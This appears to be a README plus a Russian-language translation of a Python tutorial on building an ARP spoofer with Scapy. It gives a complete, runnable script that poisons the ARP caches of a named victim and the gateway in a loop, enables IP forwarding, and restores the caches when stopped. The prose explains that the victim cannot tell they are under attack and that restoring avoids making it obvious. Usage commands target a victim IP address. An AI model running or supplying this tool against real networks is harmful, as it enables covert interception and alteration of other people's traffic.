# [Building an ARP Spoofer](https://www.thepythoncode.com/article/building-arp-spoofer-using-scapy)
to run this:
- `pip3 install -r requirements.txt`
- 
    ```
    python3 arp_spoof.py --help
    ```
    **Output**:
    ```
    usage: arp_spoof.py [-h] [-v] target host

    ARP spoof script

    positional arguments:
    target         Victim IP Address to ARP poison
    host           Host IP Address, the host you wish to intercept packets for
                    (usually the gateway)

    optional arguments:
    -h, --help     show this help message and exit
    -v, --verbose  verbosity, default is True (simple message each second)
    ```
    For instance, if you want to spoof **192.168.1.2** and the gateway is **192.168.1.1**:
    ```
    python3 arp_spoof 192.168.1.2 192.168.1.1 --verbose
    ```
##
# [Building an ARP Spoofer](https://www.thepythoncode.com/article/building-arp-spoofer-using-scapy)
Что такое ARP Спуфинг
Короче говоря, это метод получения ситуации «человек посередине». Технически говоря, это метод, с помощью которого злоумышленник отправляет поддельные ARP-пакеты (ложные пакеты) в сеть (или конкретные хосты), позволяя злоумышленнику перехватывать, изменять или модифицировать сетевой трафик на лету.

Как только вы (как злоумышленник) станете человеком посередине, вы можете буквально перехватить или изменить все, что проходит в или из устройства жертвы. Итак, в этом уроке мы напишем скрипт Python, чтобы сделать именно это.

В обычной сети все устройства обычно обмениваются данными со шлюзом, а затем с Интернетом, как показано на следующем рисунке:



Теперь злоумышленнику необходимо отправить ARP-ответы обоим хостам:

Отправка ARP-ответа шлюзу со словами«У меня есть IP-адрес жертвы».
Отправка ARP-ответа жертве, в котором говорится, что «у меня есть IP-адрес шлюза».



Как только злоумышленник выполнит атаку ARP Spoof, как показано на предыдущем рисунке, он окажется в ситуации «человек посередине»:

Человек в средней ситуацииВ этот момент, как только жертва отправляет какой-либо пакет (например, HTTP-запрос), он сначала передается на машину злоумышленника. Затем он перенаправит пакет на шлюз, поэтому, как вы можете заметить, жертва не знает об этой атаке. Другими словами, они не смогут понять, что на них нападают.

Ладно, хватит теории! Прежде чем мы начнем, вам необходимо установить необходимые библиотеки:

    ```
	pip3 install scapy
    ```
    
Проверьте этот учебник, чтобы заставить Scapy правильно работать на вашем компьютере, если вы используете Windows. Дополнительно необходимо установить pywin32, например:

    ```
	pip3 install pywin32
    ```


Написание скрипта Python
Прежде всего, нам нужно импортировать необходимые модули:

    ```
	from scapy.all import Ether, ARP, srp, send
	import argparse
	import time
	import os
	import sys
    ```

Примечание: Вам нужно иметь библиотеку Scapy, установленную на вашем компьютере, перейдите к этому сообщению или официальному веб-сайту Scapy.

В начале я должен упомянуть, что нам нужно включить IP-пересылку.

Существует множество способов включения IP-маршрутизации на различных платформах. Тем не менее, я сделал модуль python здесь, чтобы включить IP-маршрутизацию в Windows, не беспокоясь ни о чем.

Для Unix-подобных пользователей (платформа, предлагаемая для этого учебника) вам нужно отредактировать файл "/proc/sys/net/ipv4/ip_forward", который требует доступа root, и поставить значение 1, которое указывает как включенное. Ознакомьтесь с этим руководством для получения дополнительной информации. Эта функция делает это в любом случае:

    ```
	def _enable_linux_iproute():
	    """
	    Enables IP route ( IP Forward ) in linux-based distro
	    """
	    file_path = "/proc/sys/net/ipv4/ip_forward"
	    with open(file_path) as f:
	        if f.read() == 1:
	            # already enabled
	            return
	    with open(file_path, "w") as f:
	        print(1, file=f)
    ```

Для пользователей Windows после копирования services.py в текущий каталог можно скопировать и вставить следующую функцию:

    ```
	def _enable_windows_iproute():
	    """
	    Enables IP route (IP Forwarding) in Windows
	    """
	    from services import WService
	    # enable Remote Access service
	    service = WService("RemoteAccess")
	    service.start()
    ```

Приведенная ниже функция управляет включением IP-маршрутизации на всех платформах:

    ```
	def enable_ip_route(verbose=True):
	    """
	    Enables IP forwarding
	    """
	    if verbose:
	        print("[!] Enabling IP Routing...")
	    _enable_windows_iproute() if "nt" in os.name else _enable_linux_iproute()
	    if verbose:
	        print("[!] IP Routing enabled.")
    ```

Теперь давайте перейдем к классным вещам. Во-первых, нам нужна функция утилиты, которая позволяет нам получить MAC-адрес любой машины в сети:

    ```
	def get_mac(ip):
	    """
	    Returns MAC address of any device connected to the network
	    If ip is down, returns None instead
	    """
	    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
	    if ans:
	        return ans[0][1].src
    ```

Мы используем функцию srp() Scapy, которая отправляет запросы в виде пакетов и продолжает прослушивать ответы; в этом случае мы отправляем запросы ARP и прослушиваем любые ответы ARP.

Во-вторых, мы собираемся создать функцию, которая выполняет основную работу этого учебника; учитывая целевой IP-адрес и IP-адрес хоста, он изменяет кэш ARP целевого IP-адреса, говоря, что у нас есть IP-адрес хоста:

    ```
	def spoof(target_ip, host_ip, verbose=True):
	    """
	    Spoofs `target_ip` saying that we are `host_ip`.
	    it is accomplished by changing the ARP cache of the target (poisoning)
	    """
	    # get the mac address of the target
	    target_mac = get_mac(target_ip)
	    # craft the arp 'is-at' operation packet, in other words; an ARP response
	    # we don't specify 'hwsrc' (source MAC address)
	    # because by default, 'hwsrc' is the real MAC address of the sender (ours)
	    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
	    # send the packet
	    # verbose = 0 means that we send the packet without printing any thing
	    send(arp_response, verbose=0)
	    if verbose:
	        # get the MAC address of the default interface we are using
	        self_mac = ARP().hwsrc
	        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))
    ```

Приведенный выше код получает MAC-адрес цели, создает вредоносный пакет ответа (ответа) ARP, а затем отправляет его.

Как только мы захотим остановить атаку, нам нужно переназначить реальные адреса целевому устройству (а также шлюзу), если мы этого не сделаем, жертва потеряет подключение к Интернету, и будет очевидно, что что-то произошло, мы не хотим этого делать, мы отправим семь законных пакетов ответа ARP (обычная практика) последовательно:

    ```
	def restore(target_ip, host_ip, verbose=True):
	    """
	    Restores the normal process of a regular network
	    This is done by sending the original informations 
	    (real IP and MAC of `host_ip` ) to `target_ip`
	    """
	    # get the real MAC address of target
	    target_mac = get_mac(target_ip)
	    # get the real MAC address of spoofed (gateway, i.e router)
	    host_mac = get_mac(host_ip)
	    # crafting the restoring packet
	    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")
	    # sending the restoring packet
	    # to restore the network to its normal process
	    # we send each reply seven times for a good measure (count=7)
	    send(arp_response, verbose=0, count=7)
	    if verbose:
	        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))
    ```

Это было похоже на функцию spoof(), и единственное отличие заключается в том, что она отправляет несколько легитимных пакетов. Другими словами, он посылает правдивую информацию.

Теперь нам нужно будет написать основной код, который подделывает оба; цель и хост (шлюз) бесконечно до тех пор, пока не будет обнаружен CTRL+C, поэтому мы восстановим исходные адреса:

    ```
	if __name__ == "__main__":
	    # victim ip address
	    target = "192.168.1.100"
	    # gateway ip address
	    host = "192.168.1.1"
	    # print progress to the screen
	    verbose = True
	    # enable ip forwarding
	    enable_ip_route()
	    try:
	        while True:
	            # telling the `target` that we are the `host`
	            spoof(target, host, verbose)
	            # telling the `host` that we are the `target`
	            spoof(host, target, verbose)
	            # sleep for one second
	            time.sleep(1)
	    except KeyboardInterrupt:
	        print("[!] Detected CTRL+C ! restoring the network, please wait...")
	        restore(target, host)
	        restore(host, target)
    ```



Я запустил сценарий на машине Linux. Вот скриншот моего результата:



В этом примере я использовал свой персональный компьютер в качестве жертвы. Если вы попытаетесь проверить кэш ARP:



Вы увидите, что MAC-адрес злоумышленника (в данном случае «192.168.1.105») совпадает с адресом шлюза. Мы абсолютно одурачены!

На компьютере злоумышленника, когда вы нажимаете CTRL + C, чтобы закрыть программу, вот скриншот процесса восстановления:



Вернувшись к компьютеру жертвы, вы увидите, что исходный MAC-адрес шлюза восстановлен:


